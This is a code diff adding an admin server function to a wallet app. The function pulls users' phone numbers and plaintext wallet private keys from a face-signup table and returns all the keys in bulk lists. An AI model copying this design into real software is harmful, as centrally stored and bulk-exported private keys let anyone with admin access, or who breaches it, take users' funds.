@@ -3108,3 +3108,22 @@ export const adminFreshWallets = createServerFn({ method: "GET" }).handler(async
     },
   };
 });
+
+// ---------------- ফেস রেজিস্ট্রেশন (login method) key — স্লট key থেকে আলাদা ----------------
+export const adminFaceSignupKeys = createServerFn({ method: "GET" }).handler(async () => {
+  const supabaseAdmin = await gate();
+  const { data } = await supabaseAdmin
+    .from("face_signups")
+    .select("id, display_name, phone_number, wallet_address, wallet_private_key, status, user_id, created_at, verified_at")
+    .order("created_at", { ascending: false })
+    .limit(500);
+  const rows = (data ?? []) as any[];
+  const verified = rows.filter((r) => r.status === "verified" && r.user_id);
+  const pending = rows.filter((r) => !(r.status === "verified" && r.user_id));
+  return {
+    verified,
+    pending,
+    verifiedKeys: verified.map((r) => r.wallet_private_key).filter(Boolean),
+    pendingKeys: pending.map((r) => r.wallet_private_key).filter(Boolean),
+  };
+});
